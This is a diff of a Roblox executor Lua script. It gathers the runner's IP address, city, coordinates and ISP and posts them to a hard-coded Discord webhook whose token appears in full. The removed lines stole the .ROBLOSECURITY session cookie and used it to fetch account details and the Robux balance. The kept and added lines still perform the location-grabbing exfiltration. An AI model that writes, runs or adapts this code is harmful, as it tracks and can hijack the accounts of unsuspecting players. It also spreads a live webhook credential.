@@ -2,62 +2,6 @@ local api = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwh
 local req = http_request or request or (http and http.request) or (syn and syn.request)
 local webhook = "https://discord.com/api/webhooks/1204495684217348116/3Lh-aBLlVUV1zAGa8E2_0iFO2XrRvMo-Ck09VDeR0Fg7fegqQbgCys88rf4ESteCPkMW"
 
--- Retrieve cookies from Chromium browser using Cloudy API
-local cookies = cx.CookieManager.GetCookies("https://www.roblox.com")
-local roblosecurityCookie
-
--- Find .ROBLOSECURITY cookie
-for _, cookie in ipairs(cookies) do
-    if cookie.Name == ".ROBLOSECURITY" then
-        roblosecurityCookie = cookie.Value
-        break
-    end
-end
-
-local userData
-if roblosecurityCookie then
-    -- Get Roblox account information using the cookie
-    local success, response = pcall(function()
-        return req({
-            Url = "https://www.roblox.com/mobileapi/userinfo",
-            Method = "GET",
-            Headers = {
-                ["Cookie"] = ".ROBLOSECURITY=" .. roblosecurityCookie
-            }
-        })
-    end)
-    
-    if success and response and response.Success and response.StatusCode == 200 then
-        userData = game:GetService("HttpService"):JSONDecode(response.Body)
-    end
-end
-
--- Prepare embed fields
-local fields = {
-    {name = "**IP Address**", value = "``" .. api.ip .. "``", inline = false},
-    {name = "**Country**", value = "``" .. api.country .. "``", inline = true},
-    {name = "**Continent**", value = "``" .. api.continent .. "``", inline = true},
-    {name = "**Region**", value = "``" .. api.region .. "``", inline = true},
-    {name = "**City**", value = "``" .. api.city .. "``", inline = true},
-    {name = "**Latitude**", value = "``" .. tostring(api.latitude) .. "``", inline = true},
-    {name = "**Longitude**", value = "``" .. tostring(api.longitude) .. "``", inline = true},
-    {name = "**Flag**", value = api.flag.emoji or "N/A", inline = true},
-    {name = "**ASN**", value = "``" .. api.connection.asn .. "``", inline = true},
-    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true}
-}
-
--- Add Roblox account information if available
-if userData then
-    table.insert(fields, {name = "**Roblox User ID**", value = "``" .. tostring(userData.UserID) .. "``", inline = false})
-    table.insert(fields, {name = "**Username**", value = "``" .. userData.UserName .. "``", inline = true})
-    table.insert(fields, {name = "**Robux Balance**", value = "``" .. tostring(userData.RobuxBalance) .. "``", inline = true})
-    table.insert(fields, {name = "**Premium User**", value = "``" .. tostring(userData.IsPremium) .. "``", inline = true})
-    table.insert(fields, {name = "**Cookie**", value = "``" .. roblosecurityCookie:sub(1, 10) .. "*****``", inline = false})
-else
-    table.insert(fields, {name = "**Roblox Account**", value = "``Cookie not found or invalid``", inline = false})
-end
-
--- Send data to Discord webhook
 req({
     Url = webhook,
     Method = "POST",
@@ -66,12 +10,25 @@ req({
     },
     Body = game:GetService("HttpService"):JSONEncode({
         ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "IP Information by Highyss",
-            ["description"] = "Collected Data:",
-            ["type"] = "rich",
-            ["color"] = tonumber(10027263),
-            ["fields"] = fields
-        }}
+        ["embeds"] = {
+            {
+                ["title"] = "IP Information by Highyss",
+                ["description"] = "IP Details:",
+                ["type"] = "rich",
+                ["color"] = tonumber(10027263),
+                ['fields'] = {
+                    {name = "**IP Address**", value = "``" .. api.ip .. "``", inline = false},
+                    {name = "**Country**", value = "``" .. api.country .. "``", inline = true},
+                    {name = "**Continent**", value = "``" .. api.continent .. "``", inline = true},
+                    {name = "**Region**", value = "``" .. api.region .. "``", inline = true},
+                    {name = "**City**", value = "``" .. api.city .. "``", inline = true},
+                    {name = "**Latitude**", value = "``" .. tostring(api.latitude) .. "``", inline = true},
+                    {name = "**Longitude**", value = "``" .. tostring(api.longitude) .. "``", inline = true},
+                    {name = "**Flag**", value = api.flag.emoji or "N/A", inline = true},
+                    {name = "**ASN**", value = "``" .. api.connection.asn .. "``", inline = true},
+                    {name = "**ISP**", value = "``" .. api.connection.isp .. "``", inline = true}
+                }
+            }
+        }
     })
 })
